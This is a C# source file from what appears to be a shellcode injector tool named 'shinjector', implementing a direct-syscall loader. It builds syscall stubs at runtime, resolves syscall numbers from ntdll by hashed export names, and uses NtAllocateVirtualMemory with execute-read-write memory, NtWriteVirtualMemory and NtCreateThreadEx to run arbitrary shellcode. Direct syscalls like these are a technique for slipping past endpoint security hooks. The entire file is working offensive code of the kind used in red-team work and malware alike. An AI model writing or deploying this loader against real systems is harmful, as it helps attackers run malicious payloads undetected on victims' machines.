using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace shinjector.Casos
{
    public class Syscall
    {

        public static byte[] shellCode = {
                    0x4C, 0x8B, 0xD1,             // mov r10, rcx
                    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0x00 <- (sysCall identifier)
                    0x0F, 0x05,                   // sysCall
                    0xC3                          // ret
            };


        private static byte[] GetSysCallAsm(int id)
        {

            var copy = shellCode;
            var sysCallIdentifierBytes = BitConverter.GetBytes(id);
            Buffer.BlockCopy(sysCallIdentifierBytes, 0, copy, 4, sizeof(uint));

            return copy;
        }

        private static object[] executeSyscall(int id, string function, object[] args)
        {
            byte[] sc = GetSysCallAsm(id);

            unsafe
            {

                IntPtr memoryAddress = IntPtr.Zero;
                var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)sc.Length));

                DInvoke.DynamicInvoke.Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1),
                    ref memoryAddress,
                    IntPtr.Zero,
                    ref lpValue,
                    (uint)(DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Reserve | DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Commit),
                    (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ReadWrite);

                Marshal.Copy(sc, 0, memoryAddress, sc.Length);

                DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1),
                                                                    ref memoryAddress,
                                                                    ref lpValue,
                                                                    (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead);

                Delegate sysCallDelegate = null;
                switch (function)
                {
                    case "NtAllocateVirtualMemory":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory));
                            break;
                        }
                    case "NtWriteVirtualMemory":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory));
                            break;
                        }

                    case "NtCreateThreadEx":
                        {
                            sysCallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx));
                            break;
                        }

                    default: break;
                }

                var retValue = sysCallDelegate.DynamicInvoke(args);

                try
                {
                    var a = (DInvoke.Data.Native.NTSTATUS)retValue;
                    if (a != DInvoke.Data.Native.NTSTATUS.Success)
                    {
                        Console.WriteLine("Error: " + retValue);
                    }
                }
                catch { }
            }

            return args;

        }

        public static void Inject(byte[] shellcode)
        {
            IntPtr hmodule = IntPtr.Zero;
            DInvoke.Data.Native.UNICODE_STRING bb = new DInvoke.Data.Native.UNICODE_STRING();
            DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref bb, @"C:\Windows\System32\ntdll.dll");
            DInvoke.DynamicInvoke.Native.LdrLoadDll(IntPtr.Zero, 0, ref bb, ref hmodule);
            List<DInvoke.DynamicInvoke.EAT> eat = DInvoke.DynamicInvoke.Generic.GetExportAddressEx(hmodule);
            var dict = DInvoke.DynamicInvoke.EAT.ConvertToDict(eat);

            IntPtr baseAddress = IntPtr.Zero;
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, new IntPtr((long)shellcode.Length));
            var id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtAllocateVirtualMemory")];
            object[] allocateMemory = { (IntPtr)(-1), baseAddress, IntPtr.Zero,lpValue,
                                  (uint)(DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Reserve | DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Commit),
                                  (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };

            baseAddress = (IntPtr)executeSyscall(id, "NtAllocateVirtualMemory", allocateMemory)[1];

            IntPtr buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
            uint bytesWritten = 0;

            object[] writeMemory = { (IntPtr)(-1), baseAddress, buffer, (uint)shellcode.Length, bytesWritten };
            id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtWriteVirtualMemory")];
            executeSyscall(id, "NtWriteVirtualMemory", writeMemory);

            IntPtr hthread = IntPtr.Zero;
            object[] createThread = { hthread,DInvoke.Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, (IntPtr)(-1),
                                      baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtCreateThreadEx")];
            executeSyscall(id, "NtCreateThreadEx", createThread);

        }
    }
}
